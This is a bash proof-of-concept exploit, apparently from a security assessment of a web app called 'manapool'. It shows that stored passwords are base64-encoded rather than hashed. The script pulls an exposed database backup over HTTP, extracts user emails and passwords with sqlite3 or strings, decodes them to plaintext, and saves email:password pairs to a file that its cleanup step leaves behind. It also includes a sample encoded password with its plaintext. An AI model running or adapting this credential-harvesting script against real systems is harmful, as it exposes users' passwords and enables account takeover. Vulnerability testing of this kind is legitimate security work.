#!/bin/bash

# POC: Weak Password Encoding (Base64 instead of Hashing)
# This script demonstrates how base64-encoded passwords in the manapool.db 
# database can be trivially decoded to plaintext

TARGET="http://localhost:3000"
DB_FILE="/tmp/manapool_poc.db"
OUTPUT_FILE="/tmp/decoded_passwords.txt"

echo "[*] Weak Password Encoding POC - Base64 Vulnerability"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Download the exposed database file
echo "[+] Step 1: Downloading exposed database file from $TARGET/s3/backups/manapool.db"
curl -s "$TARGET/s3/backups/manapool.db" -o "$DB_FILE" 2>/dev/null

if [ ! -f "$DB_FILE" ]; then
    echo "[-] Failed to download database file"
    exit 1
fi

echo "[+] Database file downloaded successfully"
echo ""

# Step 2: Extract and decode passwords
echo "[+] Step 2: Extracting users and base64-encoded passwords"
echo ""

# Query the database for users and their passwords
if command -v sqlite3 &> /dev/null; then
    # Use sqlite3 if available
    echo "[+] Using sqlite3 to query database..."
    sqlite3 "$DB_FILE" "SELECT email, password FROM users;" > /tmp/user_passwords.txt 2>/dev/null
    
    if [ -s /tmp/user_passwords.txt ]; then
        while IFS='|' read -r email password; do
            if [ ! -z "$email" ] && [ ! -z "$password" ]; then
                # Attempt to decode from base64
                decoded=$(echo -n "$password" | base64 -d 2>/dev/null)
                if [ $? -eq 0 ]; then
                    echo "[!] VULNERABILITY CONFIRMED:"
                    echo "    Email: $email"
                    echo "    Encoded: $password"
                    echo "    Decoded: $decoded"
                    echo ""
                    echo "$email:$decoded" >> "$OUTPUT_FILE"
                fi
            fi
        done < /tmp/user_passwords.txt
    fi
else
    # Fallback: use strings to extract data
    echo "[+] sqlite3 not available, using strings to extract password hashes..."
    
    # Extract email and password patterns from the database file
    strings "$DB_FILE" | grep -E "@manapool.com" > /tmp/emails.txt
    
    # Try to decode common base64 patterns
    strings "$DB_FILE" | grep -E "^[A-Za-z0-9+/]{12,}={0,2}$" > /tmp/potential_passwords.txt
    
    # Test each potential base64 string
    while read -r encoded_pass; do
        if [ ! -z "$encoded_pass" ]; then
            decoded=$(echo -n "$encoded_pass" | base64 -d 2>/dev/null)
            if [ $? -eq 0 ] && [ ! -z "$decoded" ] && ! echo "$decoded" | grep -q '[^[:print:]]'; then
                # This looks like a valid plaintext password
                echo "[!] VULNERABILITY CONFIRMED:"
                echo "    Base64 Encoded: $encoded_pass"
                echo "    Decoded to:    $decoded"
                echo ""
            fi
        fi
    done < /tmp/potential_passwords.txt
fi

# Step 3: Direct verification with known encoded password
echo "[+] Step 3: Direct verification with provided encoded password"
echo ""

# The provided example: b0pIT0diN3J4Qk91aTRy should decode to oJHOGb7rxBOui4r
TEST_ENCODED="b0pIT0diN3J4Qk91aTRy"
TEST_EXPECTED="oJHOGb7rxBOui4r"

DECODED=$(echo -n "$TEST_ENCODED" | base64 -d 2>/dev/null)

echo "[*] Test encoded password: $TEST_ENCODED"
echo "[*] Expected decoded:      $TEST_EXPECTED"
echo "[*] Actual decoded:        $DECODED"

if [ "$DECODED" = "$TEST_EXPECTED" ]; then
    echo "[!] BASE64 DECODING SUCCESSFUL - VULNERABILITY CONFIRMED"
    echo ""
    echo "[!] SECURITY IMPACT:"
    echo "    - All passwords stored in base64 can be instantly decoded"
    echo "    - Base64 is encoding, NOT cryptographic hashing"
    echo "    - No computational effort required to recover plaintext"
    echo "    - This completely defeats password security"
else
    echo "[-] Test decoding failed"
fi

echo ""
echo "[+] Cleanup"
rm -f "$DB_FILE" /tmp/user_passwords.txt /tmp/emails.txt /tmp/potential_passwords.txt

exit 0